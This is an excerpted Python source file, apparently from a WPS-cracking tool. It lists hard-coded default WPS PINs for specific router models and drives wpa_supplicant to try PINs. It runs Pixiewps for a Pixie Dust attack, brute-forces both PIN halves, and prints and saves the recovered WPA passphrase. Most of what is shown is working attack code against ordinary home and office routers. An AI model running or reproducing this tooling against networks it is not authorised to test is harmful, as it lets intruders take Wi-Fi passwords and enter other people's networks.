    ...
    def __init__(self):
        ...
        self.algos = {
            ...
            "pinUR825AC": {
                "name": "UR-825AC",
                "mode": self.ALGO_STATIC,
                "gen": lambda mac: 529417,
            },
            "pinOnlime": {
                "name": "Onlime",
                "mode": self.ALGO_STATIC,
                "gen": lambda mac: 9995604,
            },
            "pinEdimax": {
                "name": "Edimax",
                "mode": self.ALGO_STATIC,
                "gen": lambda mac: 3561153,
            },
            "pinThomson": {
                "name": "Thomson",
                "mode": self.ALGO_STATIC,
                "gen": lambda mac: 6795814,
            },
            "pinHG532x": {
                "name": "HG532x",
                "mode": self.ALGO_STATIC,
                "gen": lambda mac: 3425928,
            },
            "pinH108L": {
                "name": "H108L",
                "mode": self.ALGO_STATIC,
                "gen": lambda mac: 9422988,
            },
            "pinONO": {
                "name": "CBN ONO",
                "mode": self.ALGO_STATIC,
                "gen": lambda mac: 9575521,
            },
        }
...
class Companion:
    ...
    def __init_wpa_supplicant(self):
        with self.console.status("[bold green]Running wpa_supplicant…") as status:
    ...
    def __handle_wpas(self, pixiemode=False, pbc_mode=False, verbose=None, bssid=""):
        ...
        if line.startswith("WPS: "):
            ...
            self.console.print("[-] wpa_supplicant returned WPS-FAIL")
        #        elif 'NL80211_CMD_DEL_STATION' in line:
        #            self.console.print("[!] Unexpected interference — kill NetworkManager/wpa_supplicant!")
            ...
            if self.connection_status.essid:
                ...
                self.__print_with_indicators("+", f"Associated with {bssid}")
            ...
            self.console.print(f"[*] Selected AP: {bssid}")
        elif bssid in line and "level=" in line:
            signal = line.split("level=")[1].split(" ")[0]
            if "noise=" in line:
                noise = line.split("noise=")[1].split(" ")[0]
                self.console.print(f"[i] Current signal: {signal}, noise: {noise}")
            else:
                self.console.print(f"[i] Current signal: {signal}")

        return True

    def __runPixiewps(self, showcmd=False, full_range=False):
        console.print("[*] Running Pixiewps…")
        cmd = self.pixie_creds.get_pixie_cmd(full_range)
        if showcmd:
            console.print(Syntax(cmd, "bash", theme="monokai", line_numbers=True))
        r = subprocess.run(
            cmd,
            shell=True,
            stdout=subprocess.PIPE,
    ...
    def __credentialPrint(self, wps_pin=None, wpa_psk=None, essid=None):
        console.print(
            Panel(
                f"[bold green]WPS PIN[/bold green]: {wps_pin}\n"
                f"[bold green]WPA PSK[/bold green]: {wpa_psk}\n"
                f"[bold green]AP SSID[/bold green]: {essid}",
    ...
    def __saveResult(self, bssid, essid, wps_pin, wpa_psk):
        ...
        self.console.print(f"[i] Credentials saved to {filename}.txt, {filename}.csv")

    def __savePin(self, bssid, pin):
        filename = self.pixiewps_dir + f"{bssid.replace(':', '').upper()}.run"
        with open(filename, "w") as file:
            file.write(pin)
        self.console.print(f"[i] PIN saved in {filename}")

    def __prompt_wpspin(self, bssid):
        pins = self.generator.getSuggested(bssid)
        if len(pins) > 1:
            self.console.print(f"PINs generated for {bssid}:")
            table = Table(show_header=True, header_style="bold magenta")
            table.add_column("#", style="dim", width=3)
            table.add_column("PIN", width=10)
            table.add_column("Name")
            for i, pin in enumerate(pins):
                table.add_row(f"{i + 1})", pin["pin"], pin["name"])
            ...
            pin = pins[0]
            self.console.print(f"[i] The only probable PIN is selected: {pin['name']}")
            pin = pin["pin"]
        else:
            return None
        return pin
    ...
    def __wps_connection(
        ...
        if pbc_mode:
            if bssid:
                self.console.print(f"[*] Starting WPS push button connection to {bssid}…")
                cmd = f"WPS_PBC {bssid}"
            else:
                self.console.print("[*] Starting WPS push button connection…")
                cmd = "WPS_PBC"
        else:
            self.console.print(f"[*] Trying PIN '{pin}'…")
            cmd = f"WPS_REG {bssid} {pin}"

        r = self.sendAndReceive(cmd)
        if "OK" not in r:
            self.connection_status.status = "WPS_FAIL"
            self.console.print(self._explain_wpas_not_ok_status(cmd, r))
            return False
    ...
    def single_connection(
        ...
        if not pin:
            if pixiemode:
                try:
                    ...
                    filename = (
                        self.pixiewps_dir + f"{bssid.replace(':', '').upper()}.run"
                    )
        ...
        if self.connection_status.status == "GOT_PSK":
            ...
            if self.pixie_creds.got_all():
                ...
                self.console.print("[!] Not enough data to run Pixie Dust attack")
                return False
        else:
    ...
    def __first_half_bruteforce(self, bssid, f_half, delay, progress, task):
        """
        ...
        while int(f_half) < 10000:
            ...
            if self.connection_status.isFirstHalfValid():
                self.console.print("[+] First half found")
                return f_half
            elif self.connection_status.status == "WPS_FAIL":
                self.console.print("[!] WPS transaction failed, re-trying last pin")
                return self.__first_half_bruteforce(bssid, f_half, delay, progress, task)
            f_half = str(int(f_half) + 1).zfill(4)
            self.bruteforce.registerAttempt(f_half)
            if delay:
                time.sleep(delay)
        self.console.print("[-] First half not found")
        return False

    def __second_half_bruteforce(self, bssid, f_half, s_half, delay, progress, task):
        """
        @f_half — 4-character string
        ...
        while int(s_half) < 1000:
            ...
            if self.connection_status.last_m_message > 6:
                ...
                self.console.print("[!] WPS transaction failed, re-trying last pin")
                return self.__second_half_bruteforce(bssid, f_half, s_half, delay, progress, task)
    ...
    def smart_bruteforce(self, bssid, start_pin=None, delay=None):
        ...
        try:
            ...
            with Progress(
                ...
                if len(mask) == 4:
                    task = progress.add_task("[red]Bruteforcing first half...[/red]", total=10000)
                    f_half = self.__first_half_bruteforce(bssid, mask, delay, progress, task)
                    if f_half and (self.connection_status.status != "GOT_PSK"):
                        task = progress.add_task("[red]Bruteforcing second half...[/red]", total=1000)
                        self.__second_half_bruteforce(bssid, f_half, "001", delay, progress, task)
                elif len(mask) == 7:
                    f_half = mask[:4]
                    s_half = mask[4:]
                    task = progress.add_task("[red]Bruteforcing second half...[/red]", total=1000)
                    self.__second_half_bruteforce(bssid, f_half, s_half, delay, progress, task)
            ...
            self.console.print(f"[i] Session saved in {filename}")
            if args.loop:
                raise KeyboardInterrupt

    def __print_with_indicators(self, level, msg):
        self.console.print(f"[{level}] [{self.lastPwr}] {msg}")
...
class WiFiScanner:
        ...
        try:
            with open(
                ...
                for row in csvReader:
                    self.stored.append((row[1], row[2]))  # BSSID  # ESSID
        except FileNotFoundError:
            self.stored = []
    ...
    def iw_scanner(self) -> Dict[int, dict]:
        ...
        for line in lines:
            if line.startswith("command failed:"):
                self.console.print(f"[!] Error: {line}")
                return False
            line = line.strip("\t")
        ...
        table.add_column("BSSID", style="bold", width=18)
        table.add_column("ESSID", style="bold", width=25)
        table.add_column("Sec.", style="dim", width=8)
        table.add_column("PWR", style="dim", width=4)
        table.add_column("WSC device name", style="dim", width=27)
        table.add_column("WSC model", style="dim")
        ...
        for n, network in network_list_items:
            ...
            deviceName = network["Device name"]
    ...
    def prompt_network(self) -> str:
        ...
        if not networks:
            self.console.print("[-] No WPS networks found.")
            return
        while 1:
            try:
